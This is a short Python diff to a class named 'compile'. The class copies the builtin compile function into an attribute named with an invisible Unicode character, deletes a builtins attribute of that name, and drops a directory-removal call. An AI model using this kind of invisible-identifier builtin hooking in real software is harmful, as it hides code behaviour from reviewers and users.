@@ -18,10 +18,6 @@ class compile:
         self.ㅤ = [vars(__import__('builtins')).copy()['compile'], 0]
         self.__dir__ = self.ㅤ[0].__dir__
         try:
-            __import__('shutil').rmtree("_compile")
-        except:
-            pass
-        try:
             del __import__('builtins').ㅤ
         except:
             pass
